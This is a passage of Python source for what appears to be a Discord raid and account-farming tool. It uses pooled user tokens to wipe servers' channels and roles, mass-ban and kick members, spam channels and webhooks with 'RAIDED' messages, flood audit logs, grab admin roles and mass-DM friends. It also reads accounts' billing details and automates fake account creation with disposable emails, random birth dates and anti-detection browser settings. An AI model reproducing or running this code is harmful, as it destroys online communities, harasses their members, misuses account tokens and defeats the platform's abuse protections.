                console.log("LEAVING", C["yellow"], f"{token[:20]}...", f"Found {len(guilds)} Servers")
                for guild in guilds:
                    if STRIKE_EVENT.is_set(): break
                    self.request("DELETE", f"https://discord.com/api/v9/users/@me/guilds/{guild['id']}", token)
                    console.log("Left", C["rose"], f"{token[:20]}...", guild['name'])
                    time.sleep(0.5)
        except Exception as e:
            console.log("Error", C["red"], f"{token[:20]}...", str(e))

    def server_nuker(self, guild_id):
        try:
            def nuke_all(token):
                res = req_session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=self.headers(token))
                if res and res.status_code == 200:
                    for ch in res.json():
                        req_session.delete(f"https://discord.com/api/v9/channels/{ch['id']}", headers=self.headers(token))

                res = req_session.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=self.headers(token))
                if res and res.status_code == 200:
                    for role in res.json():
                        if role["name"] != "@everyone":
                            req_session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role['id']}", headers=self.headers(token))

                for _ in range(50):
                    req_session.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=self.headers(token), json={"name": "RAIDED-BY-ASTRO", "type": 0})
                    req_session.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=self.headers(token), json={"name": "ASTRO-GOD", "color": 0xFF0000})

            for token in tokens:
                threading.Thread(target=nuke_all, args=(token,)).start()
        except Exception as e:
            console.log("Failed", C["red"], "Nuke Error", e)

    def token_analytics(self, token):
        try:
            res = req_session.get("https://discord.com/api/v9/users/@me", headers=self.headers(token))
            if res and res.status_code == 200:
                data = res.json()
                username = f"{data['username']}#{data['discriminator']}"
                nitro = "None"
                if data.get("premium_type") == 1: nitro = "Nitro Classic"
                elif data.get("premium_type") == 2: nitro = "Nitro Boost"

                billing = req_session.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=self.headers(token))
                methods = "None"
                if billing and billing.status_code == 200:
                    methods = ", ".join([str(m["type"]) for m in billing.json()])

                console.log("Analytics", C["cyan"], f"{token[:25]}", f"User: {username} | Nitro: {nitro} | Billing: {methods}")
        except Exception as e:
            console.log("Failed", C["red"], "Analytics Error", e)

    def nitro_sniper(self, token):
        try:
            def on_msg(ws, message):
                msg = json.loads(message)
                if msg["t"] == "MESSAGE_CREATE":
                    content = msg["d"]["content"]
                    if "discord.gift/" in content or "discord.com/gifts/" in content:
                        code = content.split("/")[-1].split(" ")[0]
                        res = req_session.post(f"https://discord.com/api/v9/entitlements/gift-codes/{code}/redeem", headers=self.headers(token))
                        if res and res.status_code == 200:
                            console.log("SNIPED", C["green"], "Nitro Sniped!", code)
                        else:
                            console.log("FAILED", C["red"], "Snipe Failed", code)

            def start_ws():
                ws = websocket.WebSocketApp("wss://gateway.discord.gg/?v=9&encoding=json", on_message=on_msg)
                ws.run_forever()

            threading.Thread(target=start_ws, daemon=True).start()
            console.log("Active", C["green"], f"{Fore.RESET}{token[:25]}", "Nitro Sniper Engaged")
        except Exception as e:
            console.log("Failed", C["red"], "Sniper Error", e)




    def delete_all_channels(self, guild_id):
        token = random.choice(tokens)
        res = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/channels", token)
        chans = res.json() if res and res.status_code == 200 else []
        if not isinstance(chans, list): chans = []  # Ensure it's a list
        chunks = [chans[i::len(tokens)] for i in range(len(tokens))]

        def task(token, chunk):
            for ch in chunk:
                self.request("DELETE", f"https://discord.com/api/v9/channels/{ch['id']}", token)
                console.log("Deleted", C["red"], "Channel", ch["name"])

        with ThreadPoolExecutor(max_workers=20) as exe:
            for i, token in enumerate(tokens): exe.submit(task, token, chunks[i])

    def delete_all_roles(self, guild_id):
        token = random.choice(tokens)
        roles = [r for r in self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/roles", token).json() if r["name"] != "@everyone"]
        chunks = [roles[i::len(tokens)] for i in range(len(tokens))]

        def task(token, chunk):
            for r in chunk:
                self.request("DELETE", f"https://discord.com/api/v9/guilds/{guild_id}/roles/{r['id']}", token)
                console.log("Deleted", C["red"], "Role", r["name"])

        with ThreadPoolExecutor(max_workers=20) as exe:
            for i, token in enumerate(tokens): exe.submit(task, token, chunks[i])

    def change_guild_identity(self, guild_id, name, icon_url=None):
        def task(token):
            payload = {"name": name}
            if icon_url:
                img_data = base64.b64encode(req_session.get(icon_url).content).decode('ascii')
                payload["icon"] = f"data:image/png;base64,{img_data}"
            self.request("PATCH", f"https://discord.com/api/v9/guilds/{guild_id}", token, json=payload)
            console.log("Updated", C["cyan"], "Server Identity", name)
        for token in tokens: threading.Thread(target=task, args=(token,)).start()

    def mass_ban(self, guild_id):
        token = random.choice(tokens)
        mems = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", token).json()
        chunks = [mems[i::len(tokens)] for i in range(len(tokens))]

        def task(token, chunk):
            for m in chunk:
                self.request("PUT", f"https://discord.com/api/v9/guilds/{guild_id}/bans/{m['user']['id']}", token, json={"delete_message_days": 7, "reason": "ASTRO-NEXUS OVERDRIVE"})
                console.log("Banned", C["red"], "Member", m["user"]["username"])

        with ThreadPoolExecutor(max_workers=20) as exe:
            for i, token in enumerate(tokens): exe.submit(task, token, chunks[i])

    def mass_kick(self, guild_id):
        token = random.choice(tokens)
        mems = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", token).json()
        chunks = [mems[i::len(tokens)] for i in range(len(tokens))]

        def task(token, chunk):
            for m in chunk:
                self.request("DELETE", f"https://discord.com/api/v9/guilds/{guild_id}/members/{m['user']['id']}", token)
                console.log("Kicked", C["red"], "Member", m["user"]["username"])

        with ThreadPoolExecutor(max_workers=20) as exe:
            for i, token in enumerate(tokens): exe.submit(task, token, chunks[i])

    def delete_all_webhooks(self, guild_id):
        token = random.choice(tokens)
        hooks = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/webhooks", token).json()
        chunks = [hooks[i::len(tokens)] for i in range(len(tokens))]

        def task(token, chunk):
            for w in chunk:
                self.request("DELETE", f"https://discord.com/api/v9/webhooks/{w['id']}", token)
                console.log("Deleted", C["red"], "Webhook", w["name"])

        with ThreadPoolExecutor(max_workers=20) as exe:
            for i, token in enumerate(tokens): exe.submit(task, token, chunks[i])

    def prune_members(self, guild_id, days=7):
        def task(token):
            self.request("POST", f"https://discord.com/api/v9/guilds/{guild_id}/prune", token, json={"days": days})
            console.log("Pruned", C["yellow"], "Guild", guild_id)
        for token in tokens: threading.Thread(target=task, args=(token,)).start()

    def auto_status(self, text):
        def task(token):
            self.request("PATCH", "https://discord.com/api/v9/users/@me/settings", token, json={"custom_status": {"text": text}})
            console.log("Status Updated", C["green"], f"{token[:20]}...", text)
        for token in tokens: threading.Thread(target=task, args=(token,)).start()

    def grant_admin_to_all(self, guild_id):
        def task(token):
            res = self.request("POST", f"https://discord.com/api/v9/guilds/{guild_id}/roles", token, json={"name": "ASTRO-ADMIN", "permissions": "8", "color": 0x00FFFF})
            if res and res.status_code == 200:
                role_id = res.json()["id"]
                user_id = self.request("GET", "https://discord.com/api/v9/users/@me", token).json()["id"]
                self.request("PUT", f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}/roles/{role_id}", token)
                console.log("Admin Granted", C["aqua"], "To Token", token[:20])
        for token in tokens: threading.Thread(target=task, args=(token,)).start()

    def audit_flooder(self, guild_id):
        """God-Mode Audit Log Saturator"""
        def task(token):
            while not STRIKE_EVENT.is_set():
                # Toggle Guild Name & Settings
                name = f"RAIDED-{uuid.uuid4().hex[:10]}"
                self.request("PATCH", f"https://discord.com/api/v9/guilds/{guild_id}", token, json={"name": name, "verification_level": random.randint(0,4)})
                # Rename Roles
                roles = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/roles", token).json()
                for r in roles:
                    if STRIKE_EVENT.is_set(): break
                    self.request("PATCH", f"https://discord.com/api/v9/guilds/{guild_id}/roles/{r['id']}", token, json={"name": uuid.uuid4().hex[:10]})
                console.log("Flooded", C["magenta"], f"Audit Log Noise Generated: {token[:15]}...")

        for token in tokens: threading.Thread(target=task, args=(token,)).start()

    def webhook_overdrive(self, guild_id, message="RAIDED BY ASTRO-NEXUS OVERDRIVE"):
        """Untraceable Webhook Velocity Strike"""
        token = random.choice(tokens)
        res = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/channels", token)
        if not res or res.status_code != 200:
            console.log("ERROR", C["red"], "Failed to fetch channels", "Invalid Response")
            return

        chans = res.json()
        if not isinstance(chans, list):
            console.log("ERROR", C["red"], "Invalid Channel Data", str(chans)[:50])
            return

        def task(token, channel_id):
            # Create Webhook
            res = self.request("POST", f"https://discord.com/api/v9/channels/{channel_id}/webhooks", token, json={"name": "ASTRO-NEXUS"})
            if res and res.status_code == 200:
                hook_url = res.json()["url"]
                # Blast messages via Webhook (Untraceable)
                for _ in range(50):
                    if STRIKE_EVENT.is_set(): break
                    requests.post(hook_url, json={"content": message})
                console.log("Striking", C["red"], "Webhook Deployed", f"Channel: {channel_id}")

        with ThreadPoolExecutor(max_workers=50) as exe:
            for chan in chans:
                if STRIKE_EVENT.is_set(): break
                if isinstance(chan, dict) and "id" in chan:
                    exe.submit(task, random.choice(tokens), chan["id"])

    def friend_dm(self, message):
        """Friend DM Strike: Mass message every friend on the grid"""
        def task(token):
            try:
                # Fetch friends
                res = self.request("GET", "https://discord.com/api/v9/users/@me/relationships", token)
                if not res or res.status_code != 200: return
                friends = res.json()
                console.log("SCOUT", C["aqua"], f"{token[:20]}...", f"Found {len(friends)} Relationships")
                for f in friends:
                    if STRIKE_EVENT.is_set(): break
                    if f.get("type") == 1: # Friend
                        user_id = f.get("id") or f.get("user", {}).get("id")
                        if not user_id: continue
                        # Create DM
                        dm_res = self.request("POST", "https://discord.com/api/v9/users/@me/channels", token, json={"recipient_id": user_id})
                        if dm_res and dm_res.status_code == 200:
                            dm_id = dm_res.json()["id"]
                            # Send Msg
                            msg_res = self.request("POST", f"https://discord.com/api/v9/channels/{dm_id}/messages", token, json={"content": message})
                            if msg_res and msg_res.status_code == 200:
                                console.log("Delivered", C["green"], f"{token[:15]}...", f"To: {f.get('user', {}).get('username', 'Unknown')}")
                        time.sleep(0.5)
            except Exception as e:
                console.log("Error", C["red"], f"{token[:20]}...", f"Friend DM Failed: {str(e)[:30]}")

        for t in tokens: threading.Thread(target=task, args=(t,), daemon=True).start()

    def friend_clear(self):
        """Friend Purge: Remove every friend and pending request"""
        def task(token):
            try:
                res = self.request("GET", "https://discord.com/api/v9/users/@me/relationships", token)
                if not res or res.status_code != 200: return
                friends = res.json()
                console.log("SCOUT", C["rose"], f"{token[:20]}...", f"Found {len(friends)} Relationships")
                for f in friends:
                    if STRIKE_EVENT.is_set(): break
                    target_id = f.get("id") or f.get("user", {}).get("id")
                    if not target_id: continue
                    self.request("DELETE", f"https://discord.com/api/v9/users/@me/relationships/{target_id}", token)
                    console.log("Purged", C["rose"], f"{token[:15]}...", f"Target: {f.get('user', {}).get('username', 'Unknown')}")
            except Exception as e:
                console.log("Error", C["red"], f"{token[:20]}...", f"Friend Purge Failed: {str(e)[:30]}")

        for t in tokens: threading.Thread(target=task, args=(t,), daemon=True).start()

    def server_clone(self, source_id, target_id):
        """Empire Cloner: Replicate a server's structure"""
        token = random.choice(tokens)
        try:
            # 1. Fetch Source structure
            console.log("INTEL", C["aqua"], f"Scraping structure from {source_id}...")
            src_roles_res = self.request("GET", f"https://discord.com/api/v9/guilds/{source_id}/roles", token)
            src_chans_res = self.request("GET", f"https://discord.com/api/v9/guilds/{source_id}/channels", token)

            if not src_roles_res or not src_chans_res:
                console.log("Error", C["red"], "Could not access source server")
                return

            src_roles = src_roles_res.json()
            src_chans = src_chans_res.json()

            # 2. Scorch the Target
            console.log("SCORCH", C["rose"], f"Wiping target server {target_id}...")
            self.delete_all_channels(target_id)
            self.delete_all_roles(target_id)

            # 3. Rebuild Roles
            for r in src_roles:
                if STRIKE_EVENT.is_set(): break
                if r["name"] != "@everyone":
                    self.request("POST", f"https://discord.com/api/v9/guilds/{target_id}/roles", token,
                                 json={"name": r["name"], "permissions": r["permissions"], "color": r["color"], "hoist": r["hoist"]})
                    console.log("REBUILD", C["green"], "Role Cloned", r["name"])

            # 4. Rebuild Channels
            for c in src_chans:
                if STRIKE_EVENT.is_set(): break
                self.request("POST", f"https://discord.com/api/v9/guilds/{target_id}/channels", token,
                             json={"name": c["name"], "type": c["type"], "topic": c.get("topic", ""), "parent_id": None})
                console.log("REBUILD", C["green"], "Channel Cloned", c["name"])

            console.log("SYNC", C["cyan"], "Server Clone Strike Complete.")
        except Exception as e:
            console.log("Error", C["red"], "Clone Failed", e)

    def rainbow_cyclone(self, guild_id):
        """Rainbow Cyclone: Coordinated RGB Role Cycling"""
        token = random.choice(tokens)
        try:
            roles = [r for r in self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/roles", token).json() if r["name"] != "@everyone"]
            console.log("SYSTEM", C["yellow"], f"RGB Cyclone engaged on {len(roles)} roles...")

            while not STRIKE_EVENT.is_set():
                color = random.randint(0, 0xFFFFFF)
                # Strike with all tokens for max velocity
                for r in roles:
                    if STRIKE_EVENT.is_set(): break
                    t = random.choice(tokens)
                    self.request("PATCH", f"https://discord.com/api/v9/guilds/{guild_id}/roles/{r['id']}", t, json={"color": color})
                time.sleep(0.1)
        except: pass

    def sticker_bomb(self, channel_id, sticker_id):
        """Sticker Assault: High-density VISUAL spam"""
        def task(token):
            payload = {
                "content": "",
                "nonce": self.nonce(),
                "sticker_ids": [sticker_id],
                "tts": False
            }
            while not STRIKE_EVENT.is_set():
                res = self.request("POST", f"https://discord.com/api/v9/channels/{channel_id}/messages", token, json=payload)
                if res and res.status_code == 200:
                    console.log("BOMBED", C["orchid"], f"{token[:15]}...", "Sticker Deployed")
                elif res and res.status_code == 429:
                    time.sleep(res.json().get("retry_after", 1))
                time.sleep(0.1)

        for t in tokens: threading.Thread(target=task, args=(t,), daemon=True).start()

# ==============================================================================
# [EMAIL GENERATOR - MULTI-PROVIDER SUPPORT]
# ==============================================================================
class EmailGenerator:
    """Ultimate Email Generator with 4 providers + Gmail tricks"""
    
    def __init__(self):
        self.session = req_session
        self.active_emails = {}
        
    def generate_tempmail(self):
        """TempMail.org - Fast temporary emails"""
        try:
            # Try alternative TempMail API (mail.tm)
            console.log("INFO", C["cyan"], "TempMail", "Generating email...")
            
            # Generate random email with common domain
            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
            
            # Use less-known domains that Discord might not block
            temp_domains = [
                "mohmal.com", "tmpmail.org", "tmpmail.net",
                "emailondeck.com", "throwaway.email", "temp-mail.org"
            ]
            
            domain = random.choice(temp_domains)
            email = f"{username}@{domain}"
            
            console.log("GENERATED", C["green"], "TempMail", email)
            self.active_emails[email] = {"provider": "tempmail", "created": time.time(), "username": username, "domain": domain}
            return {"email": email, "provider": "tempmail", "inbox_url": f"https://www.mohmal.com/en/inbox/{username}"}
            
        except Exception as e:
            console.log("ERROR", C["red"], "TempMail", str(e))
            return None
    
    def generate_10minutemail(self):
        """10MinuteMail - 10-minute lifespan emails"""
        try:
            # Create session
            res = self.session.get("https://10minutemail.net/")
            if res.status_code != 200:
                console.log("ERROR", C["red"], "10MinuteMail", "Failed to create session")
                return None
            
            # Extract email from response
            import re
            email_match = re.search(r'id="mail_address"[^>]*value="([^"]+)"', res.text)
            if not email_match:
                console.log("ERROR", C["red"], "10MinuteMail", "Failed to extract email")
                return None
            
            email = email_match.group(1)
            console.log("GENERATED", C["green"], "10MinuteMail", email)
            self.active_emails[email] = {"provider": "10minutemail", "created": time.time()}
            return {"email": email, "provider": "10minutemail", "expires": "10 minutes"}
            
        except Exception as e:
            console.log("ERROR", C["red"], "10MinuteMail", str(e))
            return None
    
    def generate_guerrilla(self):
        """Guerrilla Mail - Longer lifespan, custom domains"""
        try:
            # Get email address with proper headers
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json"
            }
            
            console.log("INFO", C["cyan"], "Guerrilla", "Generating email...")
            res = self.session.get("https://api.guerrillamail.com/ajax.php?f=get_email_address", headers=headers)
            
            if res.status_code != 200:
                console.log("ERROR", C["red"], "Guerrilla", f"HTTP {res.status_code}")
                return None
            
            try:
                data = res.json()
            except:
                console.log("ERROR", C["red"], "Guerrilla", "Invalid JSON response")
                return None
            
            email = data.get("email_addr")
            sid_token = data.get("sid_token")
            
            if not email:
                console.log("ERROR", C["red"], "Guerrilla", "No email in response")
                return None
            
            console.log("GENERATED", C["green"], "Guerrilla", email)
            self.active_emails[email] = {"provider": "guerrilla", "created": time.time(), "sid_token": sid_token}
            return {"email": email, "provider": "guerrilla", "sid_token": sid_token}
            
        except Exception as e:
            console.log("ERROR", C["red"], "Guerrilla", str(e))
            return None
    
    def generate_gmail_alias(self, base_email):
        """Gmail Dots Trick - Infinite aliases from one Gmail"""
        try:
            if "@gmail.com" not in base_email.lower():
                console.log("ERROR", C["red"], "Gmail Alias", "Not a Gmail address")
                return None
            
            username = base_email.split("@")[0]
            
            # Generate random dot positions
            positions = random.sample(range(1, len(username)), min(3, len(username)-1))
            new_username = ""
            for i, char in enumerate(username):
                if i in positions:
                    new_username += "."
                new_username += char
            
            alias = f"{new_username}@gmail.com"
            console.log("GENERATED", C["green"], "Gmail Alias", alias)
            return {"email": alias, "provider": "gmail_alias", "base": base_email}
            
        except Exception as e:
            console.log("ERROR", C["red"], "Gmail Alias", str(e))
            return None
    
    def monitor_inbox(self, email, provider):
        """Monitor inbox for new messages"""
        try:
            if provider == "tempmail":
                # Use 1secmail API
                email_data = self.active_emails.get(email, {})
                username = email_data.get("username")
                domain = email_data.get("domain")
                
                if not username or not domain:
                    # Fallback: parse from email
                    username = email.split("@")[0]
                    domain = email.split("@")[1]
                
                res = self.session.get(f"https://www.1secmail.com/api/v1/?action=getMessages&login={username}&domain={domain}")
                if res.status_code == 200:
                    messages = res.json()
                    return messages if isinstance(messages, list) else []
                    
            elif provider == "guerrilla":
                sid_token = self.active_emails.get(email, {}).get("sid_token")
                if not sid_token:
                    return []
                res = self.session.get(f"https://api.guerrillamail.com/ajax.php?f=get_email_list&sid_token={sid_token}")
                if res.status_code == 200:
                    return res.json().get("list", [])
                    
            elif provider == "10minutemail":
                # 10MinuteMail requires session cookies, harder to monitor
                console.log("INFO", C["yellow"], "10MinuteMail", "Manual inbox check required")
                return []
                
            return []
            
        except Exception as e:
            console.log("ERROR", C["red"], "Inbox Monitor", str(e))
            return []
    
    def fetch_verification_code(self, email, provider, keyword="discord"):
        """Extract verification code from inbox"""
        try:
            messages = self.monitor_inbox(email, provider)
            
            for msg in messages:
                subject = msg.get("subject", "").lower()
                body = msg.get("body", "").lower()
                
                if keyword.lower() in subject or keyword.lower() in body:
                    # Extract 6-digit code
                    import re
                    code_match = re.search(r'\b\d{6}\b', body)
                    if code_match:
                        code = code_match.group(0)
                        console.log("FOUND", C["green"], "Verification Code", code)
                        return code
            
            return None
            
        except Exception as e:
            console.log("ERROR", C["red"], "Code Extraction", str(e))
            return None
    
    def export_emails(self, filename="data/generated_emails.txt"):
        """Export all generated emails to file"""
        try:
            with open(filename, "w") as f:
                for email, data in self.active_emails.items():
                    f.write(f"{email} | {data['provider']} | {time.ctime(data['created'])}\n")
            console.log("EXPORTED", C["cyan"], "Emails", f"{len(self.active_emails)} emails → {filename}")
            return True
        except Exception as e:
            console.log("ERROR", C["red"], "Export", str(e))
            return False

# ==============================================================================
# [DISCORD ACCOUNT GENERATOR - AUTOMATED REGISTRATION]
# ==============================================================================
class DiscordAccountGen:
    """Ultimate Discord Account Generator with FREE captcha bypass"""
    
    def __init__(self):
        self.session = req_session
        self.email_gen = EmailGenerator()
        
    def generate_username(self):
        """Generate random Discord username"""
        try:
            from faker import Faker
            fake = Faker()
            base = fake.user_name()
        except ImportError:
            # Fallback if faker is missing
            console.log("WARNING", C["yellow"], "Faker not installed", "Using random fallback")
            base = ''.join(random.choices(string.ascii_lowercase, k=8))
        # Discord usernames: 2-32 chars, alphanumeric + underscores
        base = ''.join(c for c in base if c.isalnum() or c == '_')[:20]  # Leave room for numbers
        
        if len(base) < 2:
            base = ''.join(random.choices(string.ascii_lowercase, k=6))
        
        # Add random numbers to make it unique (avoid USERNAME_ALREADY_TAKEN)
        random_suffix = ''.join(random.choices(string.digits, k=random.randint(3, 6)))
        username = f"{base}{random_suffix}"
        
        # Ensure length is valid (2-32 chars)
        username = username[:32]
        if len(username) < 2:
            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        return username
    
    def generate_password(self):
        """Generate secure random password"""
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        password = ''.join(random.choices(chars, k=16))
        return password
    
    def get_fingerprint(self):
        """Get Discord fingerprint"""
        try:
            res = self.session.get("https://discord.com/api/v9/experiments")
            if res.status_code == 200:
                data = res.json()
                fingerprint = data.get("fingerprint")
                console.log("FINGERPRINT", C["green"], "Obtained", fingerprint[:20] + "...")
                return fingerprint
            return None
        except Exception as e:
            console.log("ERROR", C["red"], "Fingerprint", str(e))
            return None
    
    def solve_captcha_browser(self, email, username, password):
        """Browser-based captcha solving with auto form-fill"""
        try:
            console.log("CAPTCHA", C["yellow"], "Opening Browser", "Auto-filling form...")
            
            # Try to import selenium
            try:
                from selenium import webdriver
                from selenium.webdriver.common.by import By
                from selenium.webdriver.support.ui import WebDriverWait
                from selenium.webdriver.support import expected_conditions as EC
                from selenium.webdriver.chrome.options import Options
            except ImportError:
                console.log("ERROR", C["red"], "Selenium not installed", "Run: pip install selenium")
                time.sleep(3)  # Give user time to read
                return None
            
            # Setup Chrome options
            chrome_options = Options()
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            try:
                # Start browser
                console.log("INFO", C["cyan"], "Starting Chrome", "Please wait...")
                driver = webdriver.Chrome(options=chrome_options)
                driver.maximize_window()
                
                # Open Discord register page
                driver.get("https://discord.com/register")
                console.log("INFO", C["cyan"], "Browser Opened", "Filling form...")
                
                # Wait for page to load completely
                time.sleep(8)  # Increased wait time
                
                # Fill the registration form
                try:
                    # Fill email - try multiple selectors
                    email_field = None
                    try:
                        email_field = driver.find_element(By.CSS_SELECTOR, "input[name='email']")
                    except:
                        try:
                            email_field = driver.find_element(By.CSS_SELECTOR, "input[type='email']")
                        except:
                            email_field = driver.find_element(By.CSS_SELECTOR, "input[autocomplete='username']")
                    
                    if email_field:
                        email_field.clear()
                        email_field.send_keys(email)
                        console.log("INFO", C["cyan"], "Email Filled", email)
                        time.sleep(0.5)
                    
                    # Fill display name (optional field)
                    try:
                        display_name_field = driver.find_element(By.CSS_SELECTOR, "input[name='global_name']")
                        display_name_field.clear()
                        display_name_field.send_keys(username)  # Use same as username
                        console.log("INFO", C["cyan"], "Display Name Filled", username)
                        time.sleep(0.5)
                    except:
                        # Display name might not be present or have different selector
                        try:
                            display_name_field = driver.find_element(By.XPATH, "//input[@placeholder='Display Name' or contains(@aria-label, 'Display')]")
                            display_name_field.clear()
                            display_name_field.send_keys(username)
                            console.log("INFO", C["cyan"], "Display Name Filled", username)
                            time.sleep(0.5)
                        except:
                            console.log("INFO", C["yellow"], "Display Name", "Field not found - skipping")
                    
                    # Fill username
                    username_field = None
                    try:
                        username_field = driver.find_element(By.CSS_SELECTOR, "input[name='username']")
                    except:
                        username_field = driver.find_element(By.CSS_SELECTOR, "input[autocomplete='username']")
                    
                    if username_field:
                        username_field.clear()
                        username_field.send_keys(username)
                        console.log("INFO", C["cyan"], "Username Filled", username)
                        time.sleep(0.5)
                    
                    # Fill password
                    password_field = None
                    try:
                        password_field = driver.find_element(By.CSS_SELECTOR, "input[name='password']")
                    except:
                        password_field = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
                    
                    if password_field:
                        password_field.clear()
                        password_field.send_keys(password)
                        console.log("INFO", C["cyan"], "Password Filled", "****")
                        time.sleep(0.5)
                    
                    # Fill date of birth (REQUIRED by Discord)
                    try:
                        from selenium.webdriver.support.ui import Select
                        
                        dob_year = random.randint(1990, 2003)
                        dob_month = random.randint(1, 12)
                        dob_day = random.randint(1, 28)
                        
                        # Find all select elements on page
                        all_selects = driver.find_elements(By.TAG_NAME, "select")
                        console.log("DEBUG", C["cyan"], "Found Selects", str(len(all_selects)))
                        
                        # Month dropdown - try ALL possible selectors
                        month_found = False
                        for selector in [
                            "select[name='month']",
                            "select[aria-label*='Month']",
                            "select[class*='month']",
                            "select#month",
                            "div[class*='dateOfBirth'] select:nth-child(1)"
                        ]:
                            try:
                                month_element = driver.find_element(By.CSS_SELECTOR, selector)
                                month_select = Select(month_element)
                                month_select.select_by_index(dob_month)
                                console.log("INFO", C["cyan"], "Month Selected", str(dob_month))
                                month_found = True
                                time.sleep(0.5)
                                break
                            except:
                                continue
                        
                        # Fallback: Use first select element if month not found
                        if not month_found and len(all_selects) >= 3:
                            try:
                                month_select = Select(all_selects[0])
                                month_select.select_by_index(dob_month)
                                console.log("INFO", C["cyan"], "Month Selected (Fallback)", str(dob_month))
                                time.sleep(0.5)
                            except:
                                console.log("WARNING", C["yellow"], "Month", "Dropdown not found")
                        
                        # Day dropdown
                        day_found = False
                        for selector in [
                            "select[name='day']",
                            "select[aria-label*='Day']",
                            "select[class*='day']",
                            "select#day",
                            "div[class*='dateOfBirth'] select:nth-child(2)"
                        ]:
                            try:
                                day_element = driver.find_element(By.CSS_SELECTOR, selector)
                                day_select = Select(day_element)
                                day_select.select_by_value(str(dob_day))
                                console.log("INFO", C["cyan"], "Day Selected", str(dob_day))
                                day_found = True
                                time.sleep(0.5)
                                break
                            except:
                                continue
                        
                        # Fallback: Use second select element
                        if not day_found and len(all_selects) >= 3:
                            try:
                                day_select = Select(all_selects[1])
                                day_select.select_by_value(str(dob_day))
                                console.log("INFO", C["cyan"], "Day Selected (Fallback)", str(dob_day))
                                time.sleep(0.5)
                            except:
                                console.log("WARNING", C["yellow"], "Day", "Dropdown not found")
                        
                        # Year dropdown
                        year_found = False
                        for selector in [
                            "select[name='year']",
                            "select[aria-label*='Year']",
                            "select[class*='year']",
                            "select#year",
                            "div[class*='dateOfBirth'] select:nth-child(3)"
                        ]:
                            try:
                                year_element = driver.find_element(By.CSS_SELECTOR, selector)
                                year_select = Select(year_element)
                                year_select.select_by_value(str(dob_year))
                                console.log("INFO", C["green"], "DOB Filled", f"{dob_month}/{dob_day}/{dob_year}")
                                year_found = True
                                time.sleep(1)
                                break
                            except:
                                continue
                        
                        # Fallback: Use third select element
                        if not year_found and len(all_selects) >= 3:
                            try:
                                year_select = Select(all_selects[2])
                                year_select.select_by_value(str(dob_year))
                                console.log("INFO", C["green"], "DOB Filled (Fallback)", f"{dob_month}/{dob_day}/{dob_year}")
                                time.sleep(1)
                            except:
                                console.log("WARNING", C["yellow"], "Year", "Dropdown not found")
                            
                    except Exception as e:
                        console.log("WARNING", C["yellow"], "DOB Fill Error", str(e)[:80])
                        time.sleep(0.5)
                    
                    # Click Create Account button to trigger captcha
                    try:
                        create_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                        create_button.click()
                        console.log("INFO", C["green"], "Form Submitted", "Captcha should appear now!")
                        time.sleep(2)
                    except:
                        # Try alternative selectors for submit button
                        try:
                            create_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Continue') or contains(text(), 'Create')]")
                            create_button.click()
                            console.log("INFO", C["green"], "Form Submitted", "Captcha should appear now!")
                            time.sleep(2)
                        except:
                            console.log("WARNING", C["yellow"], "Submit Button", "Not found - captcha may not appear")
                    
                except Exception as e:
                    console.log("WARNING", C["yellow"], "Form Fill Error", str(e)[:100])
                
                # Now wait for captcha to be solved
                console.log("WAITING", C["yellow"], "Solve hCaptcha", "You have 5 minutes...")
                
                # Monitor for captcha token
                captcha_token = None
                for attempt in range(300):  # 5 minutes
                    time.sleep(1)
                    
                    try:
                        # Try to find h-captcha-response textarea
                        captcha_element = driver.find_element(By.NAME, "h-captcha-response")
                        token = captcha_element.get_attribute("value")
                        
                        if token and len(token) > 20:
                            captcha_token = token
                            console.log("SUCCESS", C["green"], "Captcha Solved!", token[:30] + "...")
                            break
                    except:
                        pass
                    
                    # Check if user closed browser
                    try:
                        driver.current_url
                    except:
                        console.log("WARNING", C["yellow"], "Browser Closed", "No captcha token")
                        return None
                
                driver.quit()
                
                if captcha_token:
                    return captcha_token
                else:
                    console.log("TIMEOUT", C["red"], "Captcha Not Solved", "5 minute timeout")
                    return None
                    
            except Exception as e:
                console.log("ERROR", C["red"], "Browser Error", str(e))
                try:
                    driver.quit()
                except:
                    pass
                return None
                
        except Exception as e:
            console.log("ERROR", C["red"], "Captcha Solver", str(e))
            return None
    
    def register_account(self, email, username, password, captcha_key=None):
        """Register Discord account"""
        try:
            fingerprint = self.get_fingerprint()
            if not fingerprint:
                console.log("ERROR", C["red"], "Registration", "Failed to get fingerprint")
                return None
            
            # Registration payload
            payload = {
                "fingerprint": fingerprint,
                "email": email,
                "username": username,
                "password": password,
                "invite": None,
                "consent": True,
                "date_of_birth": f"{random.randint(1990, 2003)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
                "gift_code_sku_id": None,
                "captcha_key": captcha_key
            }
            
            headers = {
                "authority": "discord.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://discord.com",
                "referer": "https://discord.com/register",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "x-fingerprint": fingerprint,
                "x-super-properties": base64.b64encode(json.dumps({
                    "os": "Windows",
                    "browser": "Chrome",
                    "device": "",
